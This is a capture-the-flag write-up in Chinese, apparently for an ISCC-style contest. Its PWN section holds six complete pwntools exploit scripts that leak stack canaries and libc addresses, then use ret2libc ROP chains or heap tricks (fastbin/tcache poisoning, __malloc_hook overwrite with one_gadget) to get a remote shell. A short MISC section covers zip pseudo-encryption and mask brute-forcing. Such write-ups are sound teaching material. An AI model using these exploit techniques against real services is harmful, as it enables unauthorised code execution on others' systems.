# PWN
## attachment-7-校内
简单的32位ret2libc，查询出libc版本为 libc6-i386_2.35-0ubuntu3.8_amd64
```python
from pwn import *
from wstube import websocket
import sys

context(arch='i386', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12400'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vlun = 0x8049210
p.sendlineafter(b'name?\n', b'%23$p')
p.recvuntil(b'\n')
canary = int(p.recv(10), 16)
log.info('canary: ' + hex(canary))

payload = b'a' * (0x4c - 0xc) + p32(canary) + b'a' * 0xc + p32(puts_plt) + p32(vlun) + p32(puts_got)
p.sendlineafter(b'password?\n', payload)
p.recv()
puts_addr = u32(p.recv(4))
log.info('puts_addr: ' + hex(puts_addr))
if local:
    libc = ELF("./libc.so.6")
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
else:
    # from LibcSearcher import LibcSearcher
    # libc = LibcSearcher('puts', puts_addr)
    # libc_base = puts_addr - libc.dump('puts')
    # system_addr = libc_base + libc.dump('system')
    # binsh_addr = libc_base + libc.dump('str_bin_sh')

    libc_base = puts_addr - 0x072880
    system_addr = libc_base + 0x47cd0
    binsh_addr = libc_base + 0x1b90d5


p.sendlineafter(b'name?\n', b'%23$p')
payload = p32(canary) * 20 + p32(system_addr) + p32(0) + p32(binsh_addr)
payload = b'\x00' * (0x40) + p32(canary) + b'\x00' * 0xc + p32(system_addr) + p32(0) + p32(binsh_addr)
debug()
p.sendafter(b'password?\n\n', payload)
p.interactive()


```
## attachment-8-校内
用到了一点点堆的知识，free后在fastbin中，申请同样大小的堆块即可再次编辑存放flag的位置，即可满足检测条件，之后是简单的ret2libc
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12200'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

elf = ELF(elf_path)
libc = ELF(libc_path)
main = 0x40135c
pop_rdi = 0x4014c3
ret = 0x40101a
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

p.sendlineafter(b'size:', b'96')
p.sendlineafter(b'flag:', b'flag')
p.sendlineafter(b'ISCC', b'a' * 0x18)
p.recvuntil(b'a\n')
canary = u64(p.recv(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
debug()
p.sendlineafter(b'meet you', payload)
p.recvuntil(b'meet you too!\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('puts_addr: ' + hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
p.sendlineafter(b'ISCC', b'a' * 0x18)

payload = b'a' * (0x18) + p64(canary) + b'a' * 0x8 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
p.recvuntil(b'meet you')
p.sendline(payload)

p.interactive()
```
## call-擂台
还是ret2libc，没有puts函数，用write函数泄漏libc基址即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.31.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12100'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
        ''')

pop_rdi = 0x401273
pop_rsi_r15 = 0x401271
ret = 0x40101a
elf = ELF(elf_path)
libc = ELF(libc_path)
write_got = elf.got['write']
write_plt = elf.plt['write']
main = 0x401136

payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, 1,
    pop_rsi_r15, write_got, 0,
    write_plt,
    main,
])
p.recvuntil(b'is\n')
p.sendline(payload)
write_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info('write_addr: ' + hex(write_addr))
libc_base = write_addr - libc.symbols['write']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a' * (0x60 + 0x8)
payload += flat([
    ret,
    pop_rdi, binsh_addr,
    system_addr,
])
pause()
debug()
p.sendline(payload)

p.interactive()
```
## attachment-13-校内
堆利用的题，先用 unsorted bin 泄漏出libc基址，然后修改__malloc_hook和__realloc_hook执行ogg即可
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc-2.27.so'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12700'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* main
            b* $rebase(0xcd0)
            b* $rebase(0xa82)
            b* $rebase(0xb02)
            b* $rebase(0xb8c)
            b* $rebase(0xc46)
        ''')

def choose(index):
    p.sendlineafter(b'choice:\n', str(index).encode())

def add(idx, size):
    choose(1)
    p.sendlineafter(b'coordinate:\n', str(idx).encode())
    p.sendlineafter(b'required:\n', str(size).encode())

def delete(idx):
    choose(2)
    p.sendlineafter(b'cleanse:\n', str(idx).encode())

def edit(idx, size, content):
    choose(3)
    p.sendlineafter(b'inscription:\n', str(idx).encode())
    p.sendlineafter(b'length:\n', str(size).encode())
    p.sendafter(b'truth:\n', content)

def show(idx):
    choose(4)
    p.sendlineafter(b'truth:\n', str(idx).encode())

elf = ELF(elf_path)
libc = ELF(libc_path)


add(0, 0x20)
add(1, 0x600)
add(2, 0x20)
delete(1)
show(1)
__malloc_hook = u64(p.recv(6).ljust(8, b'\x00')) - 0x70
libc_base = __malloc_hook - libc.sym['__malloc_hook']
__realloc_hook = libc_base + libc.sym['__realloc_hook']
realloc = libc_base + libc.sym['realloc']
log.info(f"libc_base: {hex(libc_base)}")
ogg = [0x4f29e, 0x4f2a5, 0x4f302, 0x10a2fc]
delete(0)
edit(0, 0x20, p64(__malloc_hook - 0x8))
add(3, 0x20)
add(4, 0x20)
edit(4, 0x20, p64(libc_base + ogg[3]) + p64(realloc + 8)) #realloc调整栈帧让ogg满足条件
debug()
add(5, 0x20)


p.interactive()

```

## attachment-22-区域
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12000'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b function3
        ''')

pop_rdi = 0x4013f3
pop_rsi_r15 = 0x4013f1
ret = 0x40101a
elf = ELF(elf_path)
system_addr = elf.symbols['system']

p.sendlineafter(b'or no?', b'no')
p.sendlineafter(b'modest.', b'thanks')
debug()
p.sendafter(b'init', b'a' * 0x18 + b'b')
p.recvuntil(b'ab')
canary = u64(b'\x00' + p.recv(7))
log.info('canary: ' + hex(canary))
stack = u64(p.recv(6) + b'\x00' * 2)
log.info('stack: ' + hex(stack))
p.recvuntil(b'you')
payload = b'a' * 0x18 + p64(canary)
payload += b'b' * 0x8 + p64(ret) + p64(pop_rdi) + p64(stack + 0x18) + p64(system_addr) + b'/bin/sh\x00'
p.sendline(payload)

p.interactive()
```

## attachment-23-区域
```python
from pwn import *
from wstube import websocket
import sys

context(arch='amd64', os='linux', log_level='debug')
local = True if len(sys.argv) == 1 else False
elf_path = './' + sys.argv[0][:-3]
libc_path = './libc.so.6'
if local:
    p = process(elf_path)
else:
    ip, port = '101.200.155.151:12300'.split(':')
    p = remote(ip, port)
    # p = websocket("")

def debug():
    if local:
        gdb.attach(p, '''
            b* 0x401514
            b* 0x401283
            b* 0x40134f
            b* 0x4013e1
            b* 0x40148e
            b free
        ''')

def choose(index):
    p.sendlineafter(b'choice:\n', str(index).encode())

def add(index, size):
    choose(1)
    p.sendlineafter(b'index:\n', str(index).encode())
    p.sendlineafter(b'size:\n', str(size).encode())

def delete(index):
    choose(2)
    p.sendlineafter(b'index:\n', str(index).encode())

def edit(index, length, content):
    choose(3)
    p.sendlineafter(b'index:\n', str(index).encode())
    p.sendlineafter(b'length:\n', str(length).encode())
    p.sendafter(b'content:\n', content)

def show(index):
    choose(4)
    p.sendlineafter(b'index:\n', str(index).encode())

def exit():
    choose(5)

libc = ELF(libc_path)

add(0, 0x20)
add(1, 0x600)
add(2, 0x20)
delete(1)
show(1)

__malloc_hook = u64(p.recv(6) + b'\x00' * 2) - 0x70
libc.address = __malloc_hook - libc.symbols['__malloc_hook']
realloc = libc.symbols['realloc']
log.info('__malloc_hook: ' + hex(__malloc_hook))
log.info('libc.address: ' + hex(libc.address))
ogg = [0xe3afe, 0xe3b01, 0xe3b04]
'''
0xe3afe execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xe3b01 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL || r15 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xe3b04 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp
'''
add(1, 0x600)
delete(0)
delete(2)
edit(2, 0x20, p64(0x404000))
add(3, 0x20)
add(4, 0x20)
edit(4, 0x20, p64(0)*3 + p64(libc.address + ogg[1]))
debug()
delete(0)


p.interactive()
```
# MISC
## attachment-18-区域
拿到两个zip都要密码，先看到part1.zip的二进制数据，可以看出是伪加密
![[Pasted image 20250512095701.png]]
修改后可以解压出part1.zip
```readme.txt
一转眼，寒假已经过去，同学们都怀着怎样的心情踏上返校之路呢？

你是一名学生，从刚下高铁，准备乘坐19站地铁返回学校。短短的假期总是让人留恋，而返校的路似乎格外漫长。

在途中，你发现了一个神秘的压缩包，以及一张写着bfs???的纸条，这似乎隐藏着一些重要的信息。。。



```
掩码爆破密码
![[Pasted image 20250512142119.png]]